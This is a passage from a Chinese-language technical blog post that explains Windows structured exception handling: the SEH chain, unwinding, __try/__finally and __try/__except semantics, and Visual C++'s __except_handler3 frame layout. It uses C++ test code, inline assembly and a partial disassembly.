alt="正常函数执行弹窗"></p><p>上面的main函数当中有三个asm内联汇编代码块，第1个代码块中我们创建并安装了新的<code>_EXCEPTION_REGISTRATION</code>结构，保存前一个<code>_EXCEPTION_REGISTRATION</code>结构；在第2个代码块中我们制造了一个除以0的异常；在第3个代码块中我们恢复前一个<code>_EXCEPTION_REGISTRATION</code>结构并销毁当前的<code>_EXCEPTION_REGISTRATION</code>结构；</p><p>所以上面代码的执行流程是：创建一个<code>_EXCEPTION_REGISTRATION</code>结构—&gt;制造一个除以0异常—&gt;异常发生，执行异常代码的线程中断，转而运行SEH异常处理函数—&gt;处理完异常—&gt;继续执行刚才中断的线程。</p><h1 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h1><p>我们知道，<code>_EXCEPTION_REGISTRATION</code>是个链式结构，TIB的第一个DWORD，x86架构Intel CPU上<code>FS : [0]</code>指向这个链表的头部。也就是说，异常处理回调函数<code>_exception_handle</code>可以选择处理是否这个异常。如果<code>_exception_handle</code>返回<code>ExceptionContinueExecution</code>，则表示它不处理这个异常，那么系统移向链表的下一个<code>_EXCEPTION_REGISTRATION</code>结构并询问它是否同意处理这个异常。一旦系统找到一个同意处理这个异常的回调函数，它就停止遍历链表。</p><p>下图展示了这个过程：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210322210948.png" alt="EXCEPTION_REGISTRATION调用001"></p><p>下面的测试代码SEH002.cpp展示了异常处理回调函数不处理的情况：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">EXCEPTION_DISPOSITION</span><br><span class="line">__cdecl _except_handler(</span><br><span class="line">struct _EXCEPTION_RECORD* ExceptionRecord,</span><br><span class="line"><span class="keyword">void</span>* EstablisherFrame,</span><br><span class="line">struct _CONTEXT* ContextRecord,</span><br><span class="line"><span class="keyword">void</span>* DispatcherContext</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;异常代码（ExceptionCode） = 0x&quot;</span> &lt;&lt; hex &lt;&lt; ExceptionRecord-&gt;ExceptionCode</span><br><span class="line">&lt;&lt; <span class="string">&quot;异常标志（ExceptionFlags） = &quot;</span> &lt;&lt; ExceptionRecord-&gt;ExceptionFlags &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags == <span class="number">1</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;EH_NONCONTINUABLE&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags == <span class="number">2</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;EH_UNWINDING&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags == <span class="number">4</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;EH_EXIT_UNWIND&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags == <span class="number">8</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;EH_STACK_INVALID&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">if</span> (ExceptionRecord-&gt;ExceptionFlags == <span class="number">0x10</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;EH_NESTED_CALL&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">// 不想处理这个异常，让其它函数处理</span></span><br><span class="line"><span class="keyword">return</span> ExceptionContinueSearch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD handler = (DWORD)_except_handler;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">push handler</span><br><span class="line">push fs : [<span class="number">0</span>]</span><br><span class="line">mov fs : [<span class="number">0</span>], esp</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//制造一个除以0异常</span></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">xor</span> edx, edx</span><br><span class="line"><span class="keyword">xor</span> ecx, ecx</span><br><span class="line">mov eax, <span class="number">0x10</span></span><br><span class="line">idiv ecx <span class="comment">//EDX:EAX除以ECX</span></span><br><span class="line">&#125;</span><br><span class="line">::MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;按理说永远到不到这个地方&quot;</span>, <span class="string">&quot;NEVER GET HERE!!!&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//移除_EXCEPTION_REGISTRATION结构</span></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, [esp]<span class="comment">// 获取前一个结构</span></span><br><span class="line">mov fs : [<span class="number">0</span>], eax<span class="comment">// 安装前一个结构</span></span><br><span class="line">add esp, <span class="number">8</span><span class="comment">// 将我们的_EXCEPTION_REGISTRATION弹出堆栈</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__try &#123;</span><br><span class="line">test();</span><br><span class="line">&#125;</span><br><span class="line">__except(EXCEPTION_EXECUTE_HANDLER) &#123;<span class="comment">//1、执行异常处理程序，触发全局展开</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;main函数出现异常&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210331184347.png" alt="SEH002test001"></p><p>和预期一样，这里并没有弹出<code>::MessageBoxA(NULL, &quot;按理说永远到不到这个地方&quot;, &quot;NEVER GET HERE!!!&quot;, NULL)</code>这个弹窗。</p><p><strong>如果一个异常处理程序拒绝处理某个异常，实际上它也就无法决定流程最终将从何处恢复</strong>。</p><p>什么意思呢？就是说，处理某个异常的异常处理函数决定之后的流程将从何处恢复。比如在上面的测试代码中 test 函数没有处理异常，这个函数就非正常退出。最后在链表中后面的某个异常处理程序（main函数中的）处理了这个异常，因此出错指令后面的<code>::MessageBoxA(NULL, &quot;按理说永远到不到这个地方&quot;, &quot;NEVER GET HERE!!!&quot;, NULL)</code>没有执行。</p><p>在这个程序当中我们让其输出了<code>ExceptionCode</code>和<code>ExceptionFlags</code>。</p><p>然后让人疑惑的一个地方来了：为什么输出了两次，而且为什么两次的<code>ExceptionFlags</code>不一样？</p><h1 id="Unwind"><a href="#Unwind" class="headerlink" title="Unwind"></a>Unwind</h1><p>当一个异常处理回调函数拒绝处理某个异常时，它会被再一次调用。</p><p>具体情况是：当一个异常发生后，系统会遍历<code>_EXCEPTION_REGISTRATION</code>链表，直到找到处理这个异常的异常处理函数。如果链表中有处理这个异常的函数，那么当系统遍历到该函数的时候会又一次遍历<code>_EXCEPTION_REGISTRATION</code>链表，直到遍历到这个异常处理函数。不同于第一次，在第二次遍历中，系统会调用每一个异常处理函数，在第二次调用中，异常标志被设置为2。这个值被定义为<code>EH_UNWINDING</code>。</p><p>为什么要遍历第2次？为什么要展开？</p><p>假设main函数调用funcA()函数，funcA()函数调用funcB()函数，funcA()函数注册了一个名为SEH_A的异常处理函数，funcB()注册了一个名为SEH_B的异常处理函数。现在funcB()函数当中发生了异常，且只能SEH_A异常处理函数可以处理这个异常。假设funcB()函数中在异常发生前分配了资源，由于SEH_A在处理该异常时直接将地址修正到funcA()函数的的领空，将造成内存泄露，也可能无法执行某个类的析构函数。</p><p>现在栈当中的情况如下图：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210331215437.png" alt="SEH栈001"></p><p>由上图可以看出，如果SEH_A将esp和ebp修正到funcA()的栈桢上后，funcB()的栈桢将变为未使用状态，若后续再调用其他函数或使用局部变量，则会覆盖掉funcB()的栈帧，当然也就覆盖掉了funcB()注册的<code>_EXCEPTION_REGISTRATION</code>结构。当下次再出现异常，系统仍会在之前地址取得一个不存在的异常处理函数地址并执行，便会异常访问导致内存泄露。</p><p>在通常情况下，应调用SEH链上之前的所有异常处理函数，通知其进行清理收尾工作；另一方面，将本节点地址传给fs:[0]。这个过程被称为展开（Unwind）操作。</p><p>通常，展开（Unwind）会让栈上处理异常的帧以下的栈上的所有内容（上图蓝色部分）都被移除。也就是说，<code>_EXCEPTION_REGISTRATION</code>结构链表上处理异常的那个结构之前的所有<code>_EXCEPTION_REGISTRATION</code>结构都被移除。因为这些<code>_EXCEPTION_REGISTRATION</code>结构通常都被创建在栈上。在异常被处理后，堆栈指针和栈帧指针在内存中比那些从 <code>_EXCEPTION_REGISTRATION</code>结构链表上移除的<code>_EXCEPTION_REGISTRATION</code>结构地址高（栈高地址向低地址扩展）。</p><p>下面我们来看看编译器层面的SEH。</p><h1 id="编译器层面的SEH"><a href="#编译器层面的SEH" class="headerlink" title="编译器层面的SEH"></a>编译器层面的SEH</h1><p>为了让编译器支持SHE，编译器需要额外做一些工作。比如在进入和离开异常处理代码块时，需要实现<strong>局部展开</strong>、<strong>全局展开</strong>等工作，而且不同的编译器对其实现的方式也不相同，下面我们来看看Visul C++是如何在操作系统对SEH功能实现的基础上来创建它自己的结构化异常处理支持的。 </p><p>编译器层面的SHE包含了两方面的功能：<strong>终止处理（termination handling）和异常处理（exception handling）</strong>。</p><h2 id="终止处理-try-finally"><a href="#终止处理-try-finally" class="headerlink" title="终止处理__try/__finally"></a>终止处理__try/__finally</h2><p>终止处理就是保证程序在一段被保护的代码发生中断后（无论是异常还是其他）能够执行清理工作（清理内存、关闭文件等等）。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__try&#123;</span><br><span class="line"><span class="comment">//被保护的代码</span></span><br><span class="line">&#125;</span><br><span class="line">__finnally&#123;</span><br><span class="line"><span class="comment">//终止处理程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试代码try_finnally_test.cpp：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">try_finally_test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* p = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    __try&#123;</span><br><span class="line">    p = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="comment">/*其他导致异常的代码、return、goto等等代码*/</span></span><br><span class="line">        tmp = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    __finally&#123;</span><br><span class="line">        <span class="comment">// 释放分配的内存和信号量</span></span><br><span class="line">        <span class="keyword">if</span> (p)&#123;</span><br><span class="line">            <span class="built_in">free</span>(p);</span><br><span class="line">        &#125;</span><br><span class="line">        tmp = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终返回的tmp的值不是1而是10。</p><p>上面的try_finnally_test.cpp代码中，由于后面的代码发生了异常，这样的异常会导致程序中断，但是内存没有释放导致内存泄漏，这很危险。但是<code>__try/__finally</code>能够保证<code>__try</code>中代码执行完后（就算发生异常中断或是其他），都会进入终止处理程序<code>__finally</code>中执行，这就提高了代码的安全性。</p><h3 id="local-Unwind"><a href="#local-Unwind" class="headerlink" title="local Unwind"></a>local Unwind</h3><p>局部展开不是由异常等引起的，而是代码的自然执行过程。指某个函数中的<code>__try</code>块中的代码因为执行了return,break,goto,continue等指令使得指令流要提前流出<code>__try</code>块，这时编译器会自动生成一些代码跳转执行<code>__finally</code>块中的代码，以保证<code>__finally</code>语义的正确性。执行完<code>__finally</code>里面的代码后程序指针会回到原来的位置（除非<code>__finally</code>程序块存在return等导致函数提前结束）继续执行，这个过程好像是在<code>__try</code>的return(等)处展开了<code>__finally</code>的代码。</p><p>测试代码testLocalUnwind.cpp：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testLocalUnwind</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> HERE;<span class="comment">//执行跳转之前先局部展开</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2&quot;</span>;<span class="comment">//没有输出</span></span><br><span class="line">    &#125;</span><br><span class="line">    __finally &#123;<span class="comment">//局部展开</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">HERE:</span><br><span class="line">    &#123;<span class="comment">//执行跳转</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//局部展开会先执行finally中的语句，然后再执行goto跳转的代码段。</span></span><br><span class="line"><span class="comment">//输出：134</span></span><br></pre></td></tr></table></figure><p><strong>一般情况下，在离开当前作用域时，__finally块区域内的代码都将会被执行到。</strong></p><p>但是如果<code>__try</code>块或者外部出现了<code>ExitProcess</code>/<code>ExitThread</code>等终止线程或进程时，或者一些其他的异常导致SHE链的中断，终止处理程序<code>__finally</code>块不会得到执行。</p><p>由于局部展开会产生额外的开销，所以在<code>__try/__finally</code>中应该避免使用return/goto等语句。</p><p>如果要提前退出<code>__try</code>块可以使用<code>__leave</code>代替return等，<code>__leave</code>会直接跳转至<code>__try</code>块的结尾，但这种情况下将不会产生额外的开销。</p><h2 id="异常处理-try-except"><a href="#异常处理-try-except" class="headerlink" title="异常处理__try/__except"></a>异常处理__try/__except</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__try &#123;</span><br><span class="line"><span class="comment">//code</span></span><br><span class="line">&#125;</span><br><span class="line">__except(过滤器表达式) &#123;</span><br><span class="line"><span class="comment">//异常处理程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个<code>__try</code>块中的代码就通过创建在这个函数的栈上的一个<code>_EXCEPTION_REGISTRATION</code>结构来保护。但是在任何使用SEH的函数中只创建一个<code>_EXCEPTION_REGISTRATION</code>结构。也就是说，一个函数可以有多个<code>__try/__except</code>块，但只有一个异常帧。而且这个<code>_EXCEPTION_REGISTRATION</code>中的<code>handler</code>指向一个函数，这个函数在Visual C++的运行时库（RTL）中被称为**__except_handler3**。正是这个<code>__except_handler3</code>调用了过滤器表达式代码。</p><p>异常处理程序链表的头部被保存在FS:[0]处。因此，如果你在调试器中单步跟踪时看到类似<code>MOV DWORD PTR FS:[00000000],ESP</code>或者<code>MOV DWORD PTR FS:[00000000],ECX</code>的指令时,就基本上可以确定这段代码正在进入或退出一个<code>__try/__except</code>块。</p><p><code>__try</code>块相当于堆栈上的一个<code>_EXCEPTION_REGISTRATION</code>结构;<code>_EXCEPTION_REGISTRATION</code>结构中的<strong>回调函数</strong>相当于<strong>过滤器表达式（filter-expression）</strong>代码。实际上，过滤器表达式就是<code>__except</code>关键字后面的小括号中的代码。过滤器表达式代码随便写，但这个过滤器表达式代码的返回值决定了后面的大括号中的代码是否执行。返回值必须是以下3种之一：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXCEPTION_EXECUTE_HANDLER    1 <span class="comment">// 执行异常处理程序，触发全局展开，控制流执行到大括号中的代码</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXCEPTION_CONTINUE_SEARCH    0 <span class="comment">// 不执行，继续查找上一层的__try块</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXCEPTION_CONTINUE_EXECUTION -1 <span class="comment">// 不会触发全局展开，继续返回异常处重新执行</span></span></span><br></pre></td></tr></table></figure><h3 id="global-Unwind"><a href="#global-Unwind" class="headerlink" title="global Unwind"></a>global Unwind</h3><p>全局展开则是由异常引起的。当异常过滤器表达式的返回结果为<code>EXCEPTION_EXECUTE_HANDLER</code>，触发全局展开。全局展开导致执行其内部嵌套的尚未完成的<code>__try</code>/<code>__finally</code>块。简单的说就是发生异常后，先找到外层的能够处理该异常的<code>__try</code>/<code>__except</code>块，然后再由内向外执行还未完成的<code>__finally</code>程序块。</p><p>测试代码testGlobalUnwind.cpp：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">testGlobalUnwind</span><span class="params">()</span></span>&#123; </span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1、in testGlobalUnwind() __try:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        subTestGlobalUnwind();      <span class="comment">//触发异常的函数</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2、in testGlobalUnwind() __try: after the subTestGlobalUnwind().&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3、in testGlobalUnwind() filter-expression: excute. EXCEPTION_EXECUTE_HANDLER.\n&quot;</span> &lt;&lt; <span class="built_in">endl</span>, EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4、in testGlobalUnwind() __except:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;5、end of the testGlobalUnwind().&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">subTestGlobalUnwind</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>, b = <span class="number">0</span>, c;</span><br><span class="line">    __try &#123;</span><br><span class="line">        __try &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6、in subTestGlobalUnwind() __try:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;7、in subTestGlobalUnwind() __try: except occured!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            c = a/b;</span><br><span class="line">        &#125;</span><br><span class="line">        __finally &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;8、in subTestGlobalUnwind() __finally: Global Unwinding!!!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;9、in subTestGlobalUnwind() filter-expression: don&#x27;t excute. EXCEPTION_CONTINUE_SEARCH.\n&quot;</span>, EXCEPTION_CONTINUE_SEARCH) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10、in subTestGlobalUnwind(): __except.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 输出结果：</span></span><br><span class="line"><span class="comment"> 1、in testGlobalUnwind() __try:</span></span><br><span class="line"><span class="comment"> 6、in subTestGlobalUnwind() __try:</span></span><br><span class="line"><span class="comment"> 7、in subTestGlobalUnwind() __try: except occured!!!</span></span><br><span class="line"><span class="comment"> 9、in subTestGlobalUnwind() filter-expression: don&#x27;t excute. EXCEPTION_CONTINUE_SEARCH.</span></span><br><span class="line"><span class="comment"> 3、in testGlobalUnwind() filter-expression: excute. EXCEPTION_EXECUTE_HANDLER.</span></span><br><span class="line"><span class="comment"> 8、in subTestGlobalUnwind() __finally: Global Unwinding!!!</span></span><br><span class="line"><span class="comment"> 4、in testGlobalUnwind() __except:</span></span><br><span class="line"><span class="comment"> 5、end of the testGlobalUnwind().</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="except-handler3"><a href="#except-handler3" class="headerlink" title="__except_handler3"></a>__except_handler3</h1><p>在上面《异常处理<code>__try/__except</code>》中我们提了一句，一个<code>__try</code>就块通过<code>_EXCEPTION_REGISTRATION</code>结构保护，而在任何使用SEH的函数中只在堆栈当中创建一个<code>_EXCEPTION_REGISTRATION</code>结构，而一个<code>_EXCEPTION_REGISTRATION</code>的<code>handler</code>域指向一个<code>__except_handler3</code>异常处理函数。</p><p><code>__except_handler3</code>是<code>BaseProcessStart</code>的异常处理函数。<code>BaseProcessStart</code>我们后面会说到。</p><p>那么问题来了，如果嵌套了多个<code>__try</code>块，一个<code>_EXCEPTION_REGISTRATION</code>结构又是如何找到具体是哪一层的<code>__try</code>块发生了异常呢？</p><h2 id="扩展异常处理帧"><a href="#扩展异常处理帧" class="headerlink" title="扩展异常处理帧"></a>扩展异常处理帧</h2><p>Visual C++的编译器并未使用上面介绍的原始的<code>_EXCEPTION_REGISTRATION</code>结构，而是在此结构的基础上进行了扩展，正是扩展的这些域允许一个<code>__except_handler3</code>就处理了所有的异常并将执行流传递到<strong>异常过滤器表达式</strong>和<strong>异常处理函数（__except块）。</strong></p><p>Visual C++ RTL中的EXSUP.INC文件中关于扩展的异常处理帧的定义如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION</span> *<span class="title">prev</span>;</span><span class="comment">//指针域</span></span><br><span class="line">   <span class="keyword">void</span>(*handler)(PEXCEPTION_RECORD, PEXCEPTION_REGISTRATION, PCONTEXT,PEXCEPTION_RECORD);</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">SCOPETABLE_entry</span> *_<span class="title">SCOPETABLE</span>;</span><span class="comment">//指向一个_SCOPETABLE_entry数组</span></span><br><span class="line">   <span class="keyword">int</span> trylevel;<span class="comment">//_SCOPETABLE_entry数组的索引</span></span><br><span class="line">   <span class="keyword">int</span> _ebp;<span class="comment">//保存_EXCEPTION_REGISTRATION_RECORD结构创建之前的ebp</span></span><br><span class="line">   PEXCEPTION_POINTERS xpointers;<span class="comment">//???</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其实上面扩展的内容都是针对Visual C++的，在OS看来，其实<code>_EXCEPTION_POINTERS</code>结构就只有<code>prev</code>域和<code>handler</code>域。</p><p>之后Visual C++又压入了两个值。</p><p>一个是 ebp-14h 处为一个指向<code>_EXCEPTION_POINTERS</code>结构的指针所保留的空间。调用<code>GetExceptionInformation</code>API返回这个结构。与它相关的<code>GetExceptionCode</code>API也是如此，此函数实际上只是返回<code>GetExceptionInformation</code>返回的数据结构（<code>EXCEPTION_POINTERS</code>）中的一个结构 （<code>EXCEPTION_RECORD</code>）中的一个域（<code>ExceptionCode</code>）的值。所以<code>GetExceptionCode</code>API生成下面的汇编代码：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">mov eax, dword ptr[ebp - <span class="number">14</span>]    <span class="comment">// 执行完毕，eax指向EXCEPTION_POINTERS结构</span></span><br><span class="line">mov eax, dword ptr[eax]         <span class="comment">// 执行完毕，eax指向EXCEPTION_RECORD结构</span></span><br><span class="line">mov eax, dword ptr[eax]         <span class="comment">// 执行完毕，eax中是ExceptionCode的值</span></span><br></pre></td></tr></table></figure><p>另一个是 ebp-18h 处的用来保存所有<code>prolog</code>代码执行完毕之后的esp的值。</p><p>所以栈的样子如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ebp<span class="number">-00</span> _ebp</span><br><span class="line">ebp<span class="number">-04</span> trylevel</span><br><span class="line">ebp<span class="number">-08</span> _SCOPETABLE数组指针</span><br><span class="line">ebp<span class="number">-0</span>C handler函数地址</span><br><span class="line">ebp<span class="number">-10</span> 指向前一个_EXCEPTION_REGISTRATION结构</span><br><span class="line">ebp<span class="number">-14</span> GetExceptionInformation()API</span><br><span class="line">ebp<span class="number">-18</span> 栈帧中的标准ESP</span><br></pre></td></tr></table></figure><p>现在来看看<code>__except_handler3</code>的汇编代码：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">7</span>C839AF0 ; <span class="keyword">int</span> __cdecl _except_handler3(EXCEPTION_RECORD *pExceptionRecord,</span><br><span class="line"><span class="number">7</span>C839AF0_EXCEPTION_REGISTRATION *pRegistrationFrame, _CONTEXT *pContextRecord)</span><br><span class="line"><span class="number">7</span>C839AF0</span><br><span class="line"><span class="number">7</span>C839AF0 exceptPtrs    = dword ptr <span class="number">-8</span></span><br><span class="line"><span class="number">7</span>C839AF0 var_4           = dword ptr <span class="number">-4</span></span><br><span class="line"><span class="number">7</span>C839AF0 pExceptionRecord= dword ptr  <span class="number">8</span></span><br><span class="line"><span class="number">7</span>C839AF0 pRegistrationFrame= dword ptr  <span class="number">0</span>Ch</span><br><span class="line"><span class="number">7</span>C839AF0 pContextRecord= dword ptr  <span class="number">10</span>h  </span><br><span class="line"><span class="number">7</span>C839AF0;</span><br><span class="line"><span class="number">7</span>C839AF0; </span><br><span class="line"><span class="number">7</span>C839AF0; VC++扩展SEH</span><br><span class="line"><span class="number">7</span>C839AF0; [ebp<span class="number">-14</span>];PEXCEPTION_POINTERS xpointers;</span><br><span class="line"><span class="number">7</span>C839AF0    ;         ;<span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION</span>&#123;</span></span><br><span class="line"><span class="number">7</span>C839AF0    ; [ebp<span class="number">-10</span>];  <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION</span> *<span class="title">prev</span>;</span></span><br><span class="line"><span class="number">7</span>C839AF0    ; [ebp<span class="number">-0</span>C];  _except_handler handler;</span><br><span class="line"><span class="number">7</span>C839AF0    ; [ebp<span class="number">-08</span>];  <span class="class"><span class="keyword">struct</span> _<span class="title">SCOPETABLE_entry</span> *_<span class="title">SCOPETABLE</span>;</span></span><br><span class="line"><span class="number">7</span>C839AF0    ; [ebp<span class="number">-04</span>];  <span class="keyword">int</span> trylevel;</span><br><span class="line"><span class="number">7</span>C839AF0    ; [ebp<span class="number">-00</span>];  <span class="keyword">int</span> _ebp;</span><br><span class="line"><span class="number">7</span>C839AF0    ;         ;&#125;;</span><br><span class="line"><span class="number">7</span>C839AF0    ; pRegistrationFrame当前指向[ebp<span class="number">-10</span>]</span><br><span class="line"><span class="number">7</span>C839AF0    ;</span><br><span class="line"><span class="number">7</span>C839AF0    ;</span><br><span class="line"><span class="number">7</span>C839AF0    ; _except_handler定义</span><br><span class="line"><span class="number">7</span>C839AF0    ; <span class="keyword">typedef</span> EXCEPTION_DISPOSITION __cdecl (*_except_handler)(</span><br><span class="line"><span class="number">7</span>C839AF0    ;    _In_ struct _EXCEPTION_RECORD *_ExceptionRecord,</span><br><span class="line"><span class="number">7</span>C839AF0    ;    _In_ <span class="keyword">void</span> * _EstablisherFrame,</span><br><span class="line"><span class="number">7</span>C839AF0    ;    _Inout_ struct _CONTEXT *_ContextRecord,</span><br><span class="line"><span class="number">7</span>C839AF0    ;    _Inout_ <span class="keyword">void</span> * _DispatcherContext</span><br><span class="line"><span class="number">7</span>C839AF0    ; );</span><br><span class="line"><span class="number">7</span>C839AF0    ;</span><br><span class="line"><span class="number">7</span>C839AF0;</span><br><span class="line"><span class="number">7</span>C839AF0    ; _SCOPETABLE_entry定义</span><br><span class="line"><span class="number">7</span>C839AF0    ; <span class="class"><span class="keyword">struct</span> _<span class="title">SCOPETABLE_entry</span>&#123;</span></span><br><span class="line"><span class="number">7</span>C839AF0    ;    DWORD prevlevel;</span><br><span class="line"><span class="number">7</span>C839AF0    ;    PVOID lpfnFilter;</span><br><span class="line"><span class="number">7</span>C839AF0    ;    PVOID lpfnHandler;</span><br><span class="line"><span class="number">7</span>C839AF0    ; &#125;</span><br><span class="line"><span class="number">7</span>C839AF0</span><br><span class="line"><span class="number">7</span>C839AF0    push  ebp</span><br><span class="line"><span class="number">7</span>C839AF1    mov   ebp, esp</span><br><span class="line"><span class="number">7</span>C839AF3    sub   esp, <span class="number">8</span>          ; EXCEPTION_POINTERS exceptPtrs;</span><br><span class="line"><span class="number">7</span>C839AF6    push  ebx</span><br><span class="line"><span class="number">7</span>C839AF7    push  esi</span><br><span class="line"><span class="number">7</span>C839AF8    push  edi</span><br><span class="line"><span class="number">7</span>C839AF9    push  